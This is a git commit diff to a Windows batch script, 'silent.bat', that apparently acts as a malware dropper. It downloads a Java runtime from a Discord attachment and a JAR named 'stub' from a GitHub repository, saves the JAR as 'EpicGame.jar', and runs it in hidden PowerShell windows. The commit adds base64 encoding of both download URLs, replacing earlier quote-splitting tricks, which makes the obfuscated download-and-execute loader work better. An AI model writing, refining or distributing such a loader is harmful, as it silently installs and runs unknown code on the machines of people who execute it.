1541a8b9ca4549d1cc2e6cafd1c153fd606dabe8
Python-is-trash <xox.scaramouche.xox@gmail.com>
2024-10-11 23:07:51 +0200

    Update silent.bat

--- silent.bat
+++ silent.bat
@@ -1,7 +1,5 @@
 @echo off
 
-chcp 65001 >nul
-
 java -version >nul 2>&1
 if %errorLevel% NEQ 0 (
     goto :install_java
@@ -10,11 +8,11 @@ if %errorLevel% NEQ 0 (
 )
 
 :install_java
-set "url=https://cdn.discordapp.com/attachments/129042639"1"392686080/1293633"1"89289394196/jre1.8.0_361.zip?ex=6708154a&is=6706c3ca&hm=c85af7a9d1b522cc8d680aeb7ffc5204f6110b50058bba2b42f0679f54f4f0e7"
+set "encodedUrl=aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTI5MDQyNjM5MTM5MjY4NjA4MC8xMjkzNjMzMTg5Mjg5Mzk0MTk2L2pyZTEuOC4wXzM2MS56aXA/ZXg9NjcwODE1NGEmaXM9NjcwNmMzY2EmaG09Yzg1YWY3YTlkMWI1MjJjYzhkNjgwYWViN2ZmYzUyMDRmNjExMGI1MDA1OGJiYTJiNDJmMDY3OWY1NGY0ZjBlNw=="
 set "output=%TEMP%\jre1.8.0_361.zip"
 set "installDir=%USERPROFILE%\Java\jre1.8.0_361"
 
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%output%')"
+powershell -WindowStyle Hidden -Command "$url=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedUrl%')); (New-Object System.Net.WebClient).DownloadFile($url, '%output%')"
 
 powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%output%' -DestinationPath '%installDir%'"
 
@@ -27,10 +25,10 @@ if exist "%installDir%\jre1.8.0_361\bin\java.exe" (
 set PATH=%PATH%;%installDir%\jre1.8.0_361\bin
 
 :download_and_run_jar
-set "jarUrl=https://github.com/Python-is-trash/stub/raw/refs/heads/main/Ja"v"a.jar"
-set "jarOutput=%TEMP%\Ep"i"cGame.jar"
+set "encodedJarUrl=aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbi1pcy10cmFzaC9zdHViL3Jhdy9yZWZzL2hlYWRzL21haW4vSmF2YS5qYXI="
+set "jarOutput=%TEMP%\EpicGame.jar"
 
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%jarUrl%', '%jarOutput%')"
+powershell -WindowStyle Hidden -Command "$jarUrl=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedJarUrl%')); (New-Object System.Net.WebClient).DownloadFile($jarUrl, '%jarOutput%')"
 
 if exist "%jarOutput%" (
     powershell -WindowStyle Hidden -Command "Start-Process 'java' -ArgumentList '-jar', '%jarOutput%' -WindowStyle Hidden"
